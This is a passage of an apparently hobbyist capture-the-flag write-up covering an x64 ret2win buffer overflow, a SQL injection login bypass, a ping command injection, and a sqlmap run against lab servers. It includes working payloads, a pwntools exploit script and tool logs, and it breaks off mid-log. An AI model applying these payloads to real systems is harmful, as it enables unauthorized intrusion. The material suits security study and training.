+│           0x00401287      488b05822d00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
+│                                                                      ; [0x404010:8]=0                             
+│           0x0040128e      488d0d740f00.  lea rcx, str.e_0m           ; 0x402209
+│           0x00401295      488d15720f00.  lea rdx, str.e_1_32m        ; 0x40220e
+│           0x0040129c      488d35750f00.  lea rsi, str._n_sCongratulations_on_escaping__Here_is_a_sacred_spell_to_help_you_continue_your_journey:__s_n ; 0x402218 ; &#34;\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n&#34; ; const char *format                                                                 
+│           0x004012a3      4889c7         mov rdi, rax                ; FILE *stream
+│           0x004012a6      b800000000     mov eax, 0
+│           0x004012ab      e810feffff     call sym.imp.fprintf        ; int fprintf(FILE *stream, const char *format,   ...)                                                                                                           
+│           0x004012b0      be00000000     mov esi, 0                  ; int oflag
+│           0x004012b5      488d3dba0f00.  lea rdi, str.._flag.txt     ; 0x402276 ; &#34;./flag.txt&#34; ; const char *path
+│           0x004012bc      b800000000     mov eax, 0
+│           0x004012c1      e82afeffff     call sym.imp.open           ; int open(const char *path, int oflag)
+│           0x004012c6      8945fc         mov dword [fildes], eax
+│           0x004012c9      837dfc00       cmp dword [fildes], 0
+│       ┌─&lt; 0x004012cd      792e           jns 0x4012fd
+│       │   0x004012cf      488d3db20f00.  lea rdi, str._nError_opening_flag.txt__please_contact_an_Administrator._n_n ; 0x402288 ; &#34;\nError opening flag.txt, please contact an Administrator.\n\n&#34; ; const char *s                    
+&lt;...SNIP...&gt;
+</code></pre><p>We can see a victory text at address <code>0x0040129c</code>. A little further down we can see actions to open and print the flag.txt. If we can return tho this address, we might be able to produce a victory screen. Firstly, to determine the offset of the overflow:</p>
+<pre tabindex="0"><code>$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300               
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+</code></pre><p>running in gdb:</p>
+<pre tabindex="0"><code>[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7ffff7d14a37 (&lt;write+23&gt;:        cmp    rax,0xfffffffffffff000)
+RDX: 0x0 
+RSI: 0x7fffffffbc20 --&gt; 0x6d31333b315b1b0a 
+RDI: 0x7fffffffbb00 --&gt; 0x7ffff7c620d0 (&lt;funlockfile&gt;:  endbr64)
+RBP: 0x5f6e726574746170 (&#39;pattern_&#39;)
+RSP: 0x7fffffffdd78 (&#34;create.rb -&#34;)
+RIP: 0x401602 (&lt;main+509&gt;:      ret)
+R8 : 0x23 (&#39;#&#39;)
+R9 : 0x7ffff7d7cd70 (mov    r10,QWORD PTR [rsi-0x1b])
+R10: 0x20554f59205d2d5b (&#39;[-] YOU &#39;)
+R11: 0x246 
+R12: 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)
+R13: 0x401405 (&lt;main&gt;:  push   rbp)
+R14: 0x0 
+R15: 0x7ffff7ffd040 --&gt; 0x7ffff7ffe2e0 --&gt; 0x0
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4015f7 &lt;main+498&gt;: call   0x4010c0 &lt;fprintf@plt&gt;
+   0x4015fc &lt;main+503&gt;: mov    eax,0x0
+   0x401601 &lt;main+508&gt;: leave
+=&gt; 0x401602 &lt;main+509&gt;: ret
+   0x401603:    cs nop WORD PTR [rax+rax*1+0x0]
+   0x40160d:    nop    DWORD PTR [rax]
+   0x401610 &lt;__libc_csu_init&gt;:  push   r15
+   0x401612 &lt;__libc_csu_init+2&gt;:        lea    r15,[rip+0x2727]        # 0x403d40
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd78 (&#34;create.rb -&#34;)
+0008| 0x7fffffffdd80 --&gt; 0x2d2062 (&#39;b -&#39;)
+0016| 0x7fffffffdd88 --&gt; 0x401405 (&lt;main&gt;:      push   rbp)
+0024| 0x7fffffffdd90 --&gt; 0x100000000 
+0032| 0x7fffffffdd98 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)
+0040| 0x7fffffffdda0 --&gt; 0x0 
+0048| 0x7fffffffdda8 --&gt; 0x78a85a85f5d4e10b 
+0056| 0x7fffffffddb0 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000401602 in main ()
+</code></pre><p>The RBP contains an overflow address <code>0x6241376241366241</code>. Calculating offset:</p>
+<pre tabindex="0"><code>$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6241376241366241
+[*] Exact match at offset 48
+</code></pre><p>Double checking offset:</p>
+<pre tabindex="0"><code>$ python -c &#39;print(&#34;A&#34;*48+&#34;B&#34;*8)&#39;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
+</code></pre><p>gdb test</p>
+<pre tabindex="0"><code>[----------------------------------registers-----------------------------------]                                    
+RAX: 0x0                                                                                                            
+RBX: 0x0                                                                                                            
+RCX: 0x7ffff7d14a37 (&lt;write+23&gt;:        cmp    rax,0xfffffffffffff000)                                              
+RDX: 0x0                                                                                                            
+RSI: 0x7fffffffbc20 --&gt; 0x6d31333b315b1b0a                                                                          
+RDI: 0x7fffffffbb00 --&gt; 0x7ffff7c620d0 (&lt;funlockfile&gt;:  endbr64)                                                    
+RBP: 0x4242424242424242 (&#39;BBBBBBBB&#39;)                                                                                
+RSP: 0x7fffffffdd80 --&gt; 0x0                                                                                         
+RIP: 0x7ffff7c2000a --&gt; 0x1000000000000                                                                             
+R8 : 0x23 (&#39;#&#39;)                                                                                                     
+R9 : 0x7ffff7d7cd70 (mov    r10,QWORD PTR [rsi-0x1b])                                                               
+R10: 0x20554f59205d2d5b (&#39;[-] YOU &#39;)                                                                                
+R11: 0x246                                                                                                          
+R12: 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)             
+R13: 0x401405 (&lt;main&gt;:  push   rbp)                                                                                 
+R14: 0x0                                                                                                            
+R15: 0x7ffff7ffd040 --&gt; 0x7ffff7ffe2e0 --&gt; 0x0                                                                      
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)                                   
+[-------------------------------------code-------------------------------------]                                    
+   0x7ffff7c20003:      add    BYTE PTR [rax],cl                                                                    
+   0x7ffff7c20005:      add    BYTE PTR [rax],al                                                                    
+   0x7ffff7c20007:      add    BYTE PTR [rdi+0x7e],dl                                                               
+=&gt; 0x7ffff7c2000a:      add    BYTE PTR [rax],al                                                                    
+   0x7ffff7c2000c:      add    BYTE PTR [rax],al                                                                    
+   0x7ffff7c2000e:      add    BYTE PTR [rax],al                                                                    
+   0x7ffff7c20010:      add    DWORD PTR [rax],eax                                                                  
+   0x7ffff7c20012:      add    BYTE PTR [rax],al                                                                    
+[------------------------------------stack-------------------------------------]                                    
+0000| 0x7fffffffdd80 --&gt; 0x0                                                                                        
+0008| 0x7fffffffdd88 --&gt; 0x401405 (&lt;main&gt;:      push   rbp)                                                         
+0016| 0x7fffffffdd90 --&gt; 0x100000000                                                                                
+0024| 0x7fffffffdd98 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)                                                                                                             
+0032| 0x7fffffffdda0 --&gt; 0x0                                                                                        
+0040| 0x7fffffffdda8 --&gt; 0xb6dc04cf7d4b5e83                                                                         
+0048| 0x7fffffffddb0 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)                                                                                                             
+0056| 0x7fffffffddb8 --&gt; 0x401405 (&lt;main&gt;:      push   rbp)                                                         
+[------------------------------------------------------------------------------]                                    
+Legend: code, data, rodata, value                                                                                   
+Stopped reason: SIGSEGV                                                                                             
+0x00007ffff7c2000a in ?? () from ./glibc/libc.so.6 
+</code></pre><p>RBP: 0x4242424242424242 (&lsquo;BBBBBBBB&rsquo;). We know our overflow is successful, and now we can put whatever payload for the return function.</p>
+<p>First we can try pointing to the start of escape plan:</p>
+<pre tabindex="0"><code>$ python2 -c &#39;print(&#34;69+\n&#34;+&#34;A&#34;*48+&#34;\x55\x12\x40\x00\x00\x00\x00\x00&#34;)&#39; | ./labyrinth
+&lt;...SNIP...&gt;
+Would you like to change the door you chose?
+
+&gt;&gt; 
+[-] YOU FAILED TO ESCAPE!
+
+zsh: done                python2 -c &#39;print(&#34;69+\n&#34;+&#34;A&#34;*48+&#34;\x55\x12\x40\x00\x00\x00\x00\x00&#34;)&#39; | 
+zsh: segmentation fault  ./labyrinth
+</code></pre><p>Unfortunately preparing it this way does not work so well. I found a <a href="https://mregraoncyber.com/rop-emporium-writeup-ret2win/">writeup</a> for a similar ret2win problem that discusses the need for an additional return due in newer Ubuntu versions due to a MOVAPS issue. I&rsquo;ll try this:</p>
+<pre tabindex="0"><code>python2 -c &#39;print(&#34;69+\n&#34;+&#34;A&#34;*48+&#34;\x16\x10\x40\x00\x00\x00\x00\x00&#34;+&#34;\x55\x12\x40\x00\x00\x00\x00\x00&#34;)&#39; | ./labyrinth
+&lt;...snip...&gt;
+Would you like to change the door you chose?
+
+&gt;&gt; 
+[-] YOU FAILED TO ESCAPE!
+
+
+                \O/               
+                 |                 
+                / \               
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+zsh: done                python2 -c  | 
+zsh: segmentation fault  ./labyrinth
+</code></pre><p>We have a happy escapee, but we don&rsquo;t see the victory text or our flag. The return seems successful, but our target address isn&rsquo;t quite right? After this step I decided to write a python script that will be able to connect to the remote server and submit our payload. Lastly, after guessing a few addresses within escape_plan, I finally landed on one that works.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#elf = ELF(&#39;labyrinth&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;167.172.50.208&#39;</span><span class="p">,</span> <span class="mi">30667</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">48</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401256</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;69&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;(ROPE{.*?})&#34;</span><span class="p">,</span><span class="n">response</span><span class="o">.</span><span class="n">decode</span><span class="p">()))</span>
+</span></span></code></pre></div><p>Full output from payload:</p>
+<pre tabindex="0"><code>$ python escape.py
+[+] Opening connection to 178.62.9.10 on port 31908: Done
+/home/kali/Documents/cyber_apocalyse/pwn/challenge/e2.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(&#34;69&#34;)
+[*] Switching to interactive mode
+                                                                                                                    
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                                                                 
+▒-▸        ▒           ▒          ▒                                                                                 
+▒-▸        ▒     O     ▒          ▒                                                                                 
+▒-▸        ▒    &#39;|&#39;    ▒          ▒                                                                                 
+▒-▸        ▒    / \    ▒          ▒                                                                                 
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒                                                                                 
+                                                                                                                    
+Select door:                                                                                                        
+                                                                                                                    
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010                 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020                 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030                 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040                 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050                 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060                 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070                 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080                 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090                 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100                 
+                                                                                                                    
+&gt;&gt;                                                                                                                  
+You are heading to open the door but you suddenly see something on the wall:
+
+&#34;Fly like a bird and be free!&#34;
+
+Would you like to change the door you chose?
+
+&gt;&gt; 
+[-] YOU FAILED TO ESCAPE!                                                                                           
+                                                                                                                    
+                                                                                                                    
+                \O/                                                                                                 
+                 |                                                                                                  
+                / \                                                                                                 
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                                                                 
+▒-▸        ▒           ▒          ▒                                                                                 
+▒-▸        ▒           ▒          ▒                                                                                 
+▒-▸        ▒           ▒          ▒                                                                                 
+▒-▸        ▒           ▒          ▒                                                                                 
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒                                                                                 
+                                                                                                                    
+Congratulations on escaping! Here is a sacred spell to help you continue your journey: 
+HTB{3sc4p3_fr0m_4b0v3}
+</code></pre><p>We managed to get the flag, but working out the address ended up as guess-and-check for me.
+<code>HTB{3sc4p3_fr0m_4b0v3}</code></p>
+<h2 id="web">Web</h2>
+<h3 id="drobots">Drobots</h3>
+<blockquote>
+<p>Pandora&rsquo;s latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?
+<strong>Difficulty: very easy</strong></p>
+</blockquote>
+<hr>
+<p>Visiting the site gives us a generic login page. Trying the classic admin:admin and admin:password failed, so it&rsquo;s time to take a look at the source code supplied. Exploring database.py we see the following configuration:</p>
+<pre tabindex="0"><code>def login(username, password):
+    # We should update our code base and use techniques like parameterization to avoid SQL Injection
+    user = query_db(f&#39;SELECT password FROM users WHERE username = &#34;{username}&#34; AND password = &#34;{password}&#34; &#39;, one=True)
+</code></pre><p>The comment is a pretty plain hint that this SQL query is not well sanitized, and allows for very basic SQL injection.
+For our user submission, we will escape the username query with &ldquo;, then bypass a password check with &ldquo;OR 1=1 &ndash; &ldquo;. The end result is we will login if the database can find a user called &quot;&rdquo; or if the value 1 is equal to 1. Since the latter is always true, we should login. Note that the space after comment lines &ndash; must be present, or else this will be interpreted as minus.</p>
+<p><img src="Images/20230325103055.png" alt="image"></p>
+<p>The password will never be checked, so this can be whatever.
+Just like that, we are in. And the flag is first up on the table.</p>
+<p><img src="Images/20230325103409.png" alt="image"></p>
+<p><code>HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}</code></p>
+<h3 id="gunhead">Gunhead</h3>
+<blockquote>
+<p>During Pandora&rsquo;s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.
+<strong>Difficulty: very easy</strong></p>
+</blockquote>
+<hr>
+<p>Visiting the website we see a lot of text, and the only interactable piece seems to be a pull-up console:</p>
+<p><img src="Images/20230325103826.png" alt="image"></p>
+<p>Our options for commands are extremely limited. Perhaps the provided source code can give us  more insight?
+In ReconModel.php, we see how the program handles this ping command:</p>
+<pre tabindex="0"><code>$ cat ReconModel.php 
+&lt;?php
+#[AllowDynamicProperties]
+
+class ReconModel
+{   
+    public function __construct($ip)
+    {
+        $this-&gt;ip = $ip;
+    }
+
+    public function getOutput()
+    {
+        # Do I need to sanitize user input before passing it to shell_exec?
+        return shell_exec(&#39;ping -c 3 &#39;.$this-&gt;ip);
+    }
+}
+</code></pre><p>We have a commented note pointing out the lack of sanitization within the shell_exec. We should be able to use this /ping command to execute multiple shell commands when we include a break;
+Testing with id:</p>
+<pre tabindex="0"><code>/ping 8.8.8.8; id
+</code></pre><p><img src="Images/20230325104911.png" alt="image"></p>
+<p>We see the 2nd shows our id. This command injection is successful. We will probe the current directory, and since there&rsquo;s no harm, take a guess that flag.txt is in our current directory:</p>
+<p><img src="Images/20230325105242.png" alt="image"></p>
+<p>We didn&rsquo;t hit it this time, but using this command scheme we can keep using <code>ls</code> to poke around for the flag. Or we can try <code>find</code>.</p>
+<p><img src="Images/20230325105457.png" alt="image"></p>
+<p>Now we find it in probably the next most likely location, the base directory.</p>
+<p><img src="Images/20230325105542.png" alt="iamge"></p>
+<p><code>HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}</code></p>
+<h3 id="orbital">Orbital</h3>
+<blockquote>
+<p>In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?
+<strong>Difficulty: easy</strong></p>
+</blockquote>
+<hr>
+<p>Visiting the site shows us a generic login page. After trying the classic admin:admin and admin:password credentials, perhaps we can find more information on what&rsquo;s happening by viewing the provided source code.
+When viewing the <code>database.py</code>, we find an interesting hint/note:</p>
+<pre tabindex="0"><code>def login(username, password):
+    # I don&#39;t think it&#39;s not possible to bypass login because I&#39;m verifying the password later.
+    user = query(f&#39;SELECT username, password FROM users WHERE username = &#34;{username}&#34;&#39;, one=True)
+
+    if user:
+        passwordCheck = passwordVerify(user[&#39;password&#39;], password)
+
+        if passwordCheck:
+            token = createJWT(user[&#39;username&#39;])
+            return token
+    else:
+        return False
+</code></pre><p>Our SQL injection approach from Drobots has been remedied. Even when we bypass the username input check, the password is verified in a separate instance. Problem solved, or is it?</p>
+<p>Before moving on to probing SQL injection further, I check for potentially alternative pages by looking at the <code>routes.py</code> file. The only other page is an /export page, that requires a valid JSON token. So we will explore the login bypass further.</p>
+<p>Instead of manually checking a variety of SQL payloads, we will employ a tool to make this quick and easy: SQLmap. SQLmap can be easily set up to do post requests by passing it the request information in a file:</p>
+<pre tabindex="0"><code>$ cat post.txt         
+POST /api/login HTTP/1.1
+Host: 68.183.45.143:30274
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://68.183.45.143:30274/
+Content-Type: application/json
+Origin: http://68.183.45.143:30274
+Content-Length: 42
+Connection: close
+
+{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;password&#34;}
+</code></pre><p>Full sqlmap dump output.</p>
+<pre tabindex="0"><code>$ sqlmap -r post.txt -p username --dbms=mysql --dump 
+        ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___[(]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                   
+|_ -| . [,]     | .&#39;| . |                                                                                                                                                                                                                  
+|___|_  [&#34;]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:23:08 /2023-03-20/
+
+[19:23:08] [INFO] parsing HTTP request from &#39;post.txt&#39;
+JSON data found in POST body. Do you want to process it? [Y/n/q] y
+[19:23:16] [INFO] testing connection to the target URL
+[19:23:16] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
+[19:23:16] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:23:16] [INFO] testing if the target URL content is stable
+[19:23:16] [INFO] target URL content is stable
+[19:23:16] [INFO] heuristic (basic) test shows that (custom) POST parameter &#39;JSON username&#39; might be injectable (possible DBMS: &#39;MySQL&#39;)
+[19:23:17] [INFO] testing for SQL injection on (custom) POST parameter &#39;JSON username&#39;
+for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n] 
+[19:23:20] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+[19:23:22] [INFO] testing &#39;Boolean-based blind - Parameter replace (original value)&#39;
+[19:23:22] [INFO] testing &#39;Generic inline queries&#39;
+[19:23:22] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[19:23:25] [WARNING] reflective value(s) found and filtering out
+[19:23:28] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[19:23:34] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#39;
+[19:23:40] [INFO] testing &#39;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#39;
+[19:23:51] [INFO] testing &#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#39;
+[19:24:02] [INFO] testing &#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#39;
+[19:24:12] [INFO] testing &#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#39;
+[19:24:23] [INFO] testing &#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#39;
+[19:24:33] [INFO] testing &#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#39;
+[19:24:52] [INFO] testing &#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#39;
+[19:25:02] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (MAKE_SET)&#39;
+[19:25:02] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#39;
+[19:25:02] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (ELT)&#39;
+[19:25:03] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (ELT - original value)&#39;
+[19:25:03] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (bool*int)&#39;
+[19:25:03] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#39;
+[19:25:04] [INFO] testing &#39;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#39;
+[19:25:04] [INFO] testing &#39;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#39;
+[19:25:05] [INFO] testing &#39;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#39;
+[19:25:05] [INFO] testing &#39;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#39;
+[19:25:05] [INFO] testing &#39;MySQL &gt;= 5.0 boolean-based blind - Stacked queries&#39;
+[19:25:12] [INFO] testing &#39;MySQL &lt; 5.0 boolean-based blind - Stacked queries&#39;
+[19:25:12] [INFO] testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;
+[19:25:20] [INFO] testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#39;
+[19:25:27] [INFO] testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#39;
+[19:25:35] [INFO] testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#39;
+[19:25:43] [INFO] testing &#39;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#39;
+[19:25:43] [WARNING] potential permission problems detected (&#39;command denied&#39;)
+[19:25:51] [INFO] testing &#39;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#39;
+[19:25:59] [INFO] testing &#39;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#39;
+[19:26:06] [INFO] testing &#39;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#39;
+[19:26:14] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;
+[19:26:15] [INFO] (custom) POST parameter &#39;JSON username&#39; is &#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39; injectable 
+[19:26:15] [INFO] testing &#39;MySQL inline queries&#39;
+[19:26:15] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries (comment)&#39;
+[19:26:15] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries&#39;
+[19:26:15] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#39;
+[19:26:15] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#39;
+[19:26:16] [INFO] testing &#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#39;
+[19:26:16] [INFO] testing &#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#39;
+[19:26:16] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[19:26:26] [INFO] (custom) POST parameter &#39;JSON username&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable 
+[19:26:26] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 20 columns&#39;
+[19:26:26] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;
+[19:26:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[19:26:27] [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[19:26:27] [INFO] target URL appears to have 2 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
+n
+[19:26:51] [WARNING] if UNION based SQL injection is not detected, please consider usage of option &#39;--union-char&#39; (e.g. &#39;--union-char=1&#39;) 
+[19:26:54] [INFO] target URL appears to be UNION injectable with 2 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;--union-char&#39;? [Y/n] n
+[19:27:02] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 20 columns&#39;
+[19:27:06] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 40 columns&#39;
+[19:27:09] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 40 columns&#39;
